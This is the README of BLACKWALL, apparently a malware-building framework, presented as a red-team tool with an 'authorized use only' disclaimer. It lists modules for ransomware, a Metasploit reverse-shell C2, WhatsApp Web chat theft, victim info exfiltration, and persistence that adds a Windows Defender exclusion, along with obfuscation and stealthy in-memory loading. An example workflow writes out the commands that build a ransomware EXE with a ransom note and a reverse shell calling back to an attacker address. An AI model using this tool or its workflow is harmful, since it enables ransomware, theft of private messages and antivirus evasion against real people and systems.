## What's New

### VERSION 0.1.1
- **New Module: `daemon/chatwipe`** - WhatsApp chat extractor that automatically extracts the chats from a user's WhatsApp Web session in Google Chrome
- **Features:**
  - Automatically detects Chrome installation and WhatsApp Web login
  - Extracts both incoming and outgoing messages with timestamps

---

## Overview
**BLACKWALL** is a modular Windows malware generation framework. It empowers security researchers and red teamers to rapidly build custom malware payloads by chaining together a variety of modules—such as ransomware, persistence loaders, C2 servers, and more—into a single executable. BLACKWALL is designed for advanced adversary simulation, malware research, and authorized red team operations.

> **Warning:** This tool is for educational and authorized security research only. Misuse may be illegal and unethical.

---

## Features

- **Modular Payloads:** Chain multiple modules (ransomware, persistence, C2, etc.) into a single EXE.
- **Customizable Options:** Configure module and build options (e.g., ransom note, C2 port, EXE name).
- **In-Memory Execution:** Optional Rust loader for stealthy, in-memory payload delivery.
- **Obfuscation Support:** Optional payload obfuscation via LLVM and Rust.
- **Cross-Platform Build:** Uses Go and Rust for robust Windows payloads.
- **Fast Build Pipeline:** Output is saved to the `.LOOT` directory.

---

## Installation

1. **Clone the repository:**
   ```bash
   git clone https://github.com/sarwaaaar/BLACKWALL.git
   cd BLACKWALL
   ```
2. **Install Python 3.8+**
   ```bash
   python3 --version
   ```
3. **Install system dependencies:**
   - Go (for module compilation)
   - Rust (for in-memory loader)
   - **Docker** (required for payload obfuscation)
     - Pull the required Docker image for obfuscation:
       ```bash
       docker pull ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest
       ```
     - This image is used to obfuscate Rust payloads using LLVM during the build process.
   - On macOS:
     ```bash
     brew install go rust
     ```
   - On Linux:
     ```bash
     sudo apt install golang rustc cargo
     ```

---

## Usage

Start the tool:
```bash
python3 main.py
```

### Command Reference

- `use <module>` — Add a module to the build chain
- `set <OPTION> <VALUE>` — Set build/module options
- `show modules` — List available modules
- `show options` — Show current build/module options
- `build` — Build the final EXE payload
- `clear` — Clear selected modules
- `delete` — Remove a module from the chain
- `exit` — Exit the tool

**For detailed documentation on each command and advanced usage, see the [BLACKWALL Wiki](https://github.com/sarwaaaar/BLACKWALL/wiki).**

### Example Workflow
```
> show modules
> use daemon/bartmoss
> set NOTE "Your files have been encrypted! Contact evil@domain.com."
> use daemon/spider
> set LHOST 192.168.1.10
> set LPORT 4444
> build
```
- The final EXE will be saved in the `.LOOT` directory.

---

## Available Modules

| Module                   | Description                                                        |
|--------------------------|--------------------------------------------------------------------|
| daemon/filedaemon        | Normal C2 server to receive data                                   |
| daemon/spider            | Metasploit C2 server (reverse shell/payload delivery)              |
| daemon/bartmoss          | Ransomware builder                                                 |
| daemon/chatwipe          | WhatsApp chat extractor   |
| interfaceplug/blackout   | Screen blackout utility                                            |
| interfaceplug/suicide    | Block input (DoS)                                                  |
| quickhack/ping           | Sends back user info to the C2 server                              |
| quickhack/icepick        | Adds EXE to persistence and adds exclusion to Windows Defender      |

---

## Advanced Features
- **Module Chaining:** Combine multiple behaviors in one payload.
- **Custom Build Options:** Set EXE name, enable obfuscation, etc.
- **In-Memory Execution:** Use Rust loader for stealthy delivery.

---

## Legal Disclaimer

BLACKWALL is intended for educational purposes and authorized security testing only. You must have explicit permission to use this tool against any system or network. The authors and contributors are not responsible for misuse, damage, or legal consequences. Always follow applicable laws and ethical guidelines.

---

## Contributing

Contributions are welcome! Please fork the repository, create a feature branch, and submit a pull request with a detailed description of your changes.

---

## License

MIT License. See the `LICENSE` file for details.
